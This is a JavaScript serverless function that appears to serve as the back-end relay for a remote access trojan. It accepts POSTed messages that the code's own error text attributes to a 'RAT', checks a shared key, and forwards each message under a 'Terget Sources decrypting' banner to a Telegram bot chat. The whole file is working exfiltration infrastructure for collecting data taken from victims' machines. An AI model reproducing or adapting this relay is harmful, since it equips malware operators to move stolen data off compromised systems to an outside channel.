export default async function handler(request, response) {
    if (request.method !== 'POST') {
        return response.status(405).json({ error: 'Method Not Allowed' });
    }

    const { accessKey, ...data } = request.body;
    const expectedApiKey = process.env.MY_SECRET_API_KEY;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!expectedApiKey || !botToken || !chatId) {
        return response.status(500).json({ error: 'Server config fucked up' });
    }

    if (accessKey !== expectedApiKey) {
        return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
    }

    const preFormattedMessage = Object.values(data)[0];

    if (!preFormattedMessage || typeof preFormattedMessage !== 'string') {
        return response.status(400).json({ error: 'RAT is sending garbage.' });
    }

    try {
        const cleanedMessage = preFormattedMessage
            .replace(/\*\*/g, '')          
            .replace(/SENT/g, 'send')           
            .replace(/RECEIVED/g, 'Received'); 

        const finalMessage = `Terget Sources decrypting 💀🥀\n\n${cleanedMessage}`;

        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: finalMessage,
            }),
        });
        
        return response.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error(error);
        return response.status(500).json({ error: 'Failed to forward message' });
    }
}
